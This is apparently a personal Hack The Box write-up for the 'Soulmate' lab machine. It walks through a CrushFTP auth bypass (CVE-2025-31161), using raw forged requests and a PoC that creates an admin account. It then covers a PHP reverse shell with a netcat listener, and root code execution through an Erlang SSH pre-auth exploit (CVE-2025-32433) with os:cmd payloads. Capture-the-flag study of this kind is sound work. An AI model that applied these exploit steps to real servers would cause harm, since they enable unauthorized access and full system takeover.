- - - 
created : 06-09-2025 

Tags : #easy 

Released on 06 Sep 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Soulmate]
└─$ rustscan -a soulmate.htb -- -A 

Open 10.10.11.86:22
Open 10.10.11.86:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```
# Enumeration
## HTTP (80)

![Pasted image 20250906210319.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250906210319.png)

![Pasted image 20250906210436.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250906210436.png)

Max file size: 5MB. Formats: JPG, PNG, GIF maybe entry point.

Trying uploading `gif.php.` and similar obfuscations with new profile:

![Pasted image 20250906211949.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250906211949.png)
Not working cause they're just static files with sanitized names.

IDK why i broke this profile,made new profile, searching other vectors.

Spotted some sort of ESCAPED [Cross-site Scripting (XSS)](../../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md):

![Pasted image 20250906225755.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250906225755.png)

![Pasted image 20250906225922.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250906225922.png)

Trying payloads, seems sanitized and always escaped so no vectors here.

Also spotted user [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) in registering:

![Pasted image 20250907164842.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250907164842.png)
## FFuf

We search for subdomains with [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) fuzzing:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Soulmate]
└─$ ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -H 'Host: FUZZ.soulmate.htb' -u http://soulmate.htb -fs 154 -c 


ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
:: Progress: [3024/3024] :: Job [1/1] :: 1086 req/sec :: Duration: [0:00:03] :: Errors: 0 ::    
```

There's `ftp.soulmate.htb` Let's add it to our /etc/hosts file and visit the page:

![Pasted image 20250908181459.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908181459.png)

We have user enum here too observing the differing responses between denied access 503 and a 502 error, and in the reset password page:

![Pasted image 20250908182031.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908182031.png)
![Pasted image 20250908182018.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908182018.png)
![Pasted image 20250908181938.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908181938.png)
# Exploit
## Google Searching

If we search about CrushFTP we find a recent vulnerability:

![Pasted image 20250908182714.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908182714.png)

Here's the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md):

```http
GET /WebInterface/function/?command=getUserList&c2f=1111 HTTP/1.1
Host: target-server:8081
Cookie: CrushAuth=1743113839553_vD96EZ70ONL6xAd1DAJhXMZYMn1111
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
```

Breaking down this exploit:

1. We're using the simplest possible authorization header: `AWS4-HMAC-SHA256 Credential=crushadmin/`
2. No signature or additional S3 parameters are needed
3. The username "crushadmin" has no tilde (~), so `lookup_user_pass` defaults to `true`
4. This causes the `anyPass` parameter to be `true`, bypassing password validation entirely
5. The CrushAuth cookie doesn't need to be valid - it just needs to be 44 characters in a specific format:
    - First 13 characters as numbers (e.g., 1743113839553)
    - An underscore (_)
    - 30 characters string (e.g., vD96EZ70ONL6xAd1DAJhXMZYMn1111)
    - The last 4 characters of this string (1111) must match the c2f parameter value
    - This cookie can be completely random as long as it follows this format

Armed with a valid username, the attacker can exploit [CVE-2025-31161](../../../3%20-%20Tags/CVEs/CVE-2025-31161.md) by manipulating the Authorization header with a trailing slash, successfully bypassing authentication. This allows the attacker to create a new user, log in with administrative privileges, and access the CrushFTP admin dashboard, this is the [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) request i made:

```http
GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=szGH HTTP/1.1
Host: ftp.soulmate.htb
Content-Length: 0
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: */*
Origin: http://ftp.soulmate.htb
Referer: http://ftp.soulmate.htb/WebInterface/UserManager/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CrushAuth=1757349180138_o1GSbu31QZnKT6Q52x7hAjGynpszGH
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
DNT:1
Connection: close
```

Response code 200:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<result>
    <response_status>OK</response_status>
    <response_type>properties</response_type>
    <response_data>
        <user_list type="properties">
            <user_list type="vector">
                <user_list_subitem>ben</user_list_subitem>
                <user_list_subitem>crushadmin</user_list_subitem>
                <user_list_subitem>default</user_list_subitem>
                <user_list_subitem>jenna</user_list_subitem>
                <user_list_subitem>TempAccount</user_list_subitem>
            </user_list>
        </user_list>
    </response_data>
</result>
```

Found PoC script on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md):

![Pasted image 20250908200223.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908200223.png)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Soulmate/CVE-2025-31161]
└─$ python3 cve-2025-31161.py 
  [-] Target host not specified
usage: cve-2025-31161.py [-h] [--target_host TARGET_HOST] [--port PORT] [--target_user TARGET_USER]
                         [--new_user NEW_USER] [--password PASSWORD]

Exploit CVE-2025-31161 to create a new account

options:
  -h, --help            show this help message and exit
  --target_host TARGET_HOST
                        Target host
  --port PORT           Target port
  --target_user TARGET_USER
                        Target user
  --new_user NEW_USER   New user to create
  --password PASSWORD   Password for the new user

```

Let's try to create an admin account:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Soulmate/CVE-2025-31161]
└─$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user mdn0x --password hacker123
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: mdn0x
   [*] Password: hacker123.
```

![Pasted image 20250908200646.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908200646.png)

We are able to enter the admin panels now.
## Reverse Shell

From there, we can try upload a malicious PHP file to the web root via the file upload functionality, which will be then executed to gain a reverse shell and achieve initial access.

Changed `crushadmin` password's too, for fun:

![Pasted image 20250908202211.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908202211.png)

We can basically choose which directory and files from the system see and their permissions:

![Pasted image 20250908205115.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908205115.png)

Changed `ben` password and uploaded  the [php](../../../3%20-%20Tags/Programming%20Languages/php.md) shell in his profile to make the code run:

![Pasted image 20250908215618.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908215618.png)

[Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) setup and trigger that on http://soulmate.htb/mdn0xshell.php :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Soulmate/CVE-2025-31161]
└─$ nc -lvnp 1337


$ whoami
www-data
```

Got shell as `www-data`, we can perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) now:

```bash
$ export TERM=xterm
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@soulmate:/$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                        
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Soulmate/CVE-2025-31161]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
```

**RECAP**
Initial Access via CrushFTP Auth Bypass ([CVE-2025-31161](../../../3%20-%20Tags/CVEs/CVE-2025-31161.md)): The exploit relies on a valid username and a specific manipulation of the Authorization header (adding a trailing slash) to bypass authentication, allowing the attacker to create a new user and gain admin access to the CrushFTP interface.
# Privilege Escalation
## www-data to Root (bypassing user)

Found a config file for [SQL](../../../3%20-%20Tags/Programming%20Languages/SQL.md) database:

```bash
www-data@soulmate:~/soulmate.htb/config$ cat config.php 
<?php
class Database {
    private $db_file = '../data/soulmate.db';
    private $pdo;

    public function __construct() {
        $this->connect();
        $this->createTables();
    }

    private function connect() {
        try {
            // Create data directory if it doesn't exist
            $dataDir = dirname($this->db_file);
            if (!is_dir($dataDir)) {
                mkdir($dataDir, 0755, true);
            }

            $this->pdo = new PDO('sqlite:' . $this->db_file);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    private function createTables() {
        $sql = "
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

        $this->pdo->exec($sql);

        // Create default admin user if not exists
        $adminCheck = $this->pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
        $adminCheck->execute(['admin']);
        
        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')
            ");
            $adminInsert->execute(['admin', $adminPassword]);
        }
    }

    public function getConnection() {
        return $this->pdo;
    }
}

// Helper functions
function redirect($path) {
    header("Location: $path");
    exit();
}

function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

function requireLogin() {
    if (!isLoggedIn()) {
        redirect('/login');
    }
}

function requireAdmin() {
    requireLogin();
    if (!isAdmin()) {
        redirect('/profile');
    }
}
```

Found the mentioned db:

```bash
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM  users;
1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.HTB{REDACTED_HASH}|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
```

This is the created database with the hashed password:

![Pasted image 20250908234849.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908234849.png)

Checked, apparently we can enter website with the password:

![Pasted image 20250908221744.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250908221744.png)

Nothing interesting here..we can't do much than see who's using the public site.

Found `passfile` in app directory on `CrushFTP`, using [HashIdentifier](../../../3%20-%20Tags/Hacking%20Tools/HashIdentifier.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Soulmate/CVE-2025-31161]
└─$ hashid 'HTB{REDACTED_HASH}'                                                 
Analyzing 
[+] Cisco-PIX(MD5) 
[+] Cisco-ASA(MD5) 
```

[Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) mode is `2400` for `PIX`: 

```bash
hashcat passfile -m 2400 -a 0  /usr/share/wordlists/rockyou.txt
```

Exhausted .

So we can access `Crushadmin` original panel with the hash password directly:

![Pasted image 20250909134743.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250909134743.png)

We don't need the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) anymore to enter the system, we can just change `ben`'s password and upload the [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md), or paste the `webprod` folder in this admin account (from server or ben) and upload directly there, then trigger.
### SSH (2222)

Checking open ports in local:

```bash
www-data@soulmate:/$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process                                                                         
udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096           127.0.0.1:9090           0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096           127.0.0.1:41549          0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096           127.0.0.1:8443           0.0.0.0:*                                                                                     
tcp     LISTEN   0        5              127.0.0.1:2222           0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096           127.0.0.1:8080           0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*                                                                                     
tcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*      users:(("nginx",pid=1196,fd=8),("nginx",pid=1195,fd=8))                        
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096             0.0.0.0:4369           0.0.0.0:*                                                                                     
tcp     LISTEN   0        128            127.0.0.1:35875          0.0.0.0:*                                                                                     
tcp     LISTEN   0        511                 [::]:80                [::]:*      users:(("nginx",pid=1196,fd=9),("nginx",pid=1195,fd=9))                        
tcp     LISTEN   0        128                 [::]:22                [::]:*                                                                                     
tcp     LISTEN   0        4096                [::]:4369              [::]:*               
```

We can see on the admin panel `2222` it's [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) enabled:

![Pasted image 20250909143829.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250909143829.png)

Trying internal tunneling function:

![Pasted image 20250909144424.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250909144424.png)

Enabling password:

![Pasted image 20250909212103.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250909212103.png)

Actually trying to access from the revshell first to check passwords:

```bash
www-data@soulmate:/$ ssh ben@localhost -p 2222
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? t^Hyes^H^H^H^H^H
Please type 'yes', 'no' or the fingerprint: yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
ben@localhost's password: 
```

No previous passwords are working, retrieving other infos from local enumeration: on target machine:

*sshd_config file.*

```bash
www-data@soulmate:/usr/share/openssh$ cat sshd_config

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

```
### LinPEAS

Running [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) just to check other things:

```bash
[+] Looking for root files in folders owned by me
total 8                                                                                                 
drwxr-xr-x 2 root root 4096 Aug 19 11:03 css
drwxr-xr-x 3 root root 4096 Aug 12 08:17 images
total 12
-rw-r--r-- 1 root root 8657 Aug 19 11:03 style.css
-rw-r--r-- 1 root root 8657 Aug 19 11:03 /var/www/soulmate.htb/public/assets/css/style.css
total 4
drwxrwxr-x 2 root www-data 4096 Sep  9 21:54 profiles
total 528
-rw-r--r-- 1 www-data www-data  11241 Sep  9 21:44 3_1757454284.jpeg
-rw-r--r-- 1 www-data www-data 513590 Sep  9 21:45 3_1757454328.png




[+] Backup files?
-rw-r--r-- 1 root root 61 Aug 27 09:23 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 0 Feb 17  2023 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 2403 Feb 17  2023 /etc/apt/sources.list.curtin.old





[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords                                                                              
/var/www/soulmate.htb/config/config.php                                                                 
/var/www/soulmate.htb/data/soulmate.db
/var/www/soulmate.htb/public/login.php
/var/www/soulmate.htb/public/register.php
/var/www/soulmate.htb/src/Models/User.php
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
/etc/ssh/sshd_config:PasswordAuthentication yes
```

Retrieved `ben` [SHA512](../../../3%20-%20Tags/Hacking%20Concepts/SHA512.md) original last created password from backups:

```xml
<userfile type="properties">
<created_time>1754488201199</created_time>
<updated_time>1754933697951</updated_time>
<root_dir>/</root_dir>
<user_name>ben</user_name>
<last_login>08/11/2025 05:32:56 PM</last_login>
<max_logins>0</max_logins>
<version>1.0</version>
<last_logins>
08/11/2025 05:32:56 PM,08/11/2025 04:58:38 PM,08/11/2025 04:47:23 PM,08/10/2025 09:24:10 AM,08/06/2025 02:11:43 PM,08/06/2025 02:03:12 PM,08/06/2025 01:57:49 PM
</last_logins>
<updated_by_username>crushadmin</updated_by_username>
<password>
SHA512:3abdb939a870d5f892cbcad7ec890b27b725ae79b954e2c23deae3de5ed7022376cd8312d11b2a8dc651d523f28b7535e1fbe6f523f95c0b56f4af7dc1d09a96
</password>
<created_by_username>crushadmin</created_by_username>
<userVersion>6</userVersion>
<updated_by_email/>
<password_history/>
</userfile>
```

Undecryptable obviously.

Found Erlgan version on the target:

```bash
www-data@soulmate:/usr/share/apps/konsole$ erl
Erlang/OTP 27 [erts-15.2.5] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit:ns]

Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
1> 
``` 

This is strictly correlate to internal servers included [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) on port `2222`, it's an ERLANG service.
### Exploit

Found recent [CVE-2025-32433](../../../3%20-%20Tags/CVEs/CVE-2025-32433.md) for ERLANG and [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md) PoC:

![Pasted image 20250910163214.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250910163214.png)

Copied on the target from attacker machine and tried there:

```
www-data@soulmate:/tmp/.donttouchme$ python3 cve_2025_32433_exploit.py 

   ___ _  _ ___ _  _    ____ ___  ____  ____ _  _ ____
  / __| | | | _ \ | | |  | _ \| _|/ ___|/ ___| | | | __ )
 | (__| |_| | _/ |_| |  | |_) | | | |   | |   | |_| | _ \
  \___|\___/|_| |___/___|  | _ <| | |___| |___| _  | |_) |
                        |_| \_\___|\____|\____|_| |_|____/

      Erlang/OTP SSH Pre-Auth RCE PoC (CVE-2025-32433)
                  For CTF Challenges by Pujari Niteesh
    
Enter target IP address (e.g., 127.0.0.1) [10.10.1.100]: 127.0.0.1
Enter target port (e.g., 2222) [2222]: 
[*] Connecting to SSH server at 127.0.0.1:2222...
[DEBUG_EXPLOIT] Sending client banner (len: 21): b'SSH-2.0-OpenSSH_8.9\r\n'
[DEBUG_EXPLOIT] Received server banner (len: 22): b'SSH-2.0-Erlang/5.2.9\r\n'
[+] Received banner: SSH-2.0-Erlang/5.2.9
[*] Sending SSH_MSG_KEXINIT...
[DEBUG_EXPLOIT] Sending KEXINIT packet (padded len: 248): 000000f407140000000000000000000000000000000000000067637572766532353531392d7368613235362c656364682d736861322d6e697374703235362c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d7368613235362c6469666669652d68656c6c6d616e2d67726f757031342d736861323536000000197273612d736861322d3235362c7273612d736861322d3531320000000a6165733132382d6374720000000a6165733132382d63747200000009686d61632d7368613100000009686d61632d73686131000000046e6f6e65000000046e6f6e650000000000000000000000000000000000000000
[*] Sending SSH_MSG_CHANNEL_OPEN...
[DEBUG_EXPLOIT] Sending CHANNEL_OPEN packet (padded len: 40): 000000240b5a0000000773657373696f6e0000000000068000000100000000000000000000000000
[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth) with command: 'file:write_file("/tmp/note.txt", <<"Exploit Ran!">>).'...
[DEBUG_EXPLOIT] Sending CHANNEL_REQUEST packet (padded len: 80): 0000004c0462000000000000000465786563010000003566696c653a77726974655f66696c6528222f746d702f6e6f74652e747874222c203c3c224578706c6f69742052616e21223e3e292e00000000
[✓] Exploit sent! If the server is vulnerable, check the target for the result (e.g., /tmp/note.txt).
[DEBUG_EXPLOIT] Received response from target after exploit (len: 1016): 000003f40814995282cf6ab06ef852a745270d4204e60000011e637572766532353531392d7368613235362c637572766532353531392d736861323536406c69627373682e6f72672c63757276653434382d7368613531322c656364682d736861322d6e697374703532312c656364682d736861322d6e697374703338342c656364682d736861322d6e697374703235362c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d7368613235362c6469666669652d68656c6c6d616e2d67726f757031362d7368613531322c6469666669652d68656c6c6d616e2d67726f757031382d7368613531322c6469666669652d68656c6c6d616e2d67726f757031342d7368613235362c6578742d696e666f2d732c6b65782d7374726963742d732d763030406f70656e7373682e636f6d000000397373682d656432353531392c65636473612d736861322d6e697374703235362c7273612d736861322d3531322c7273612d736861322d323536000000966165733235362d67636d406f70656e7373682e636f6d2c6165733235362d6374722c6165733139322d6374722c6165733132382d67636d406f70656e7373682e636f6d2c6165733132382d6374722c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c6165733235362d6362632c6165733139322d6362632c6165733132382d6362632c336465732d636263000000966165733235362d67636d406f70656e7373682e636f6d2c6165733235362d6374722c6165733139322d6374722c6165733132382d67636d406f70656e7373682e636f6d2c6165733132382d6374722c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c6165733235362d6362632c6165733139322d6362632c6165733132382d6362632c336465732d6362630000007b686d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322c686d61632d736861322d3235362c686d61632d736861312d65746d406f70656e7373682e636f6d2c686d61632d736861310000007b686d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322c686d61632d736861322d3235362c686d61632d736861312d65746d406f70656e7373682e636f6d2c686d61632d736861310000001a6e6f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c69620000001a6e6f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c696200000000000000000000000000574bd63713ab2461
[+] Received response from target after exploit: 000003f40814995282cf6ab06ef852a745270d4204e60000011e637572766532353531392d7368613235362c637572766532353531392d736861323536406c69627373682e6f72672c63757276653434382d7368613531322c656364682d736861322d6e697374703532312c656364682d736861322d6e697374703338342c656364682d736861322d6e697374703235362c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d7368613235362c6469666669652d68656c6c6d616e2d67726f757031362d7368613531322c6469666669652d68656c6c6d616e2d67726f757031382d7368613531322c6469666669652d68656c6c6d616e2d67726f757031342d7368613235362c6578742d696e666f2d732c6b65782d7374726963742d732d763030406f70656e7373682e636f6d000000397373682d656432353531392c65636473612d736861322d6e697374703235362c7273612d736861322d3531322c7273612d736861322d323536000000966165733235362d67636d406f70656e7373682e636f6d2c6165733235362d6374722c6165733139322d6374722c6165733132382d67636d406f70656e7373682e636f6d2c6165733132382d6374722c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c6165733235362d6362632c6165733139322d6362632c6165733132382d6362632c336465732d636263000000966165733235362d67636d406f70656e7373682e636f6d2c6165733235362d6374722c6165733139322d6374722c6165733132382d67636d406f70656e7373682e636f6d2c6165733132382d6374722c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c6165733235362d6362632c6165733139322d6362632c6165733132382d6362632c336465732d6362630000007b686d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322c686d61632d736861322d3235362c686d61632d736861312d65746d406f70656e7373682e636f6d2c686d61632d736861310000007b686d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322c686d61632d736861322d3235362c686d61632d736861312d65746d406f70656e7373682e636f6d2c686d61632d736861310000001a6e6f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c69620000001a6e6f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c696200000000000000000000000000574bd63713ab2461
```

Working, trying to directly retrieve flags.

		*User*
```bash
python3 cve_2025_32433_exploit.py --command 'os:cmd("cat /home/ben/user.txt > /tmp/.donttouchme/output.txt").'

www-data@soulmate:/tmp/.donttouchme$ ls
cve_2025_32433_exploit.py  output.txt
www-data@soulmate:/tmp/.donttouchme$ cat output.txt 
    HTB{REDACTED_FLAG}
```

		*Root*
```
python3 cve_2025_32433_exploit.py --command 'os:cmd("cat /root/root.txt > /tmp/.donttouchme/outputroot.txt").'


www-data@soulmate:/tmp/.donttouchme$ cat outputroot.txt 
   HTB{REDACTED_FLAG}

```

From here we can easily have complete access to the system as root with another [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) crafted by the PoC script.